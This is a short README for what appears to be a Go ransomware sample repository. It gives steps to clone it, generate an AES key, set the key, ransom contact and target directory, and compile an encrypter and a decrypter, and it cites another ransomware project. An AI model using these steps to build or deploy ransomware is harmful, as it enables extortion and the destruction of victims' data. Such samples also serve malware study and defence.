# Ransom_Sample
 
## How to Copy
```bash
git clone https://github.com/schecthellraiser606/Ramsom_Go_Sample.git
```

## Configure and Compile
```bash
# Go to folder
$ cd Ransom_Go_Sample

# Generate a AES crypto key
$ go run keygen/keygen.go

# In encrypter nd decrypter, set the variables cryptoKey, contact and dir

# Compile encrypter
$ cd encrypter
$ go build

# Compile decrypter
$ cd decrypter
$ go build
```

## Reference
https://github.com/LuanSilveiraSouza/rangoware